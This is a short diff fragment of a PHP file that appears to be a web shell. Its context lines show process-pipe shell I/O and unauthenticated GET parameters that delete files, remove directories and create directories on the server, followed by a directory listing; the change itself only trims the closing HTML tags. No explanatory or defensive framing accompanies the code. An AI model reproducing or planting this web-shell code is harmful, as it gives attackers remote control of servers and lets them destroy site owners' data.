@@ -279,4 +279,4 @@ if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($
 <?php }else{if(isset($_GET['delete']) && ($_GET['delete'] != "")){$file = $_GET['delete'];@unlink($file);} 
 elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){@rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR));}
 elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){$path = $pwd.$_GET['mkdir'];@mkdir($path);}$buff = showdir($pwd,$prompt);echo $buff;}
-?></div></body></html>
+?>
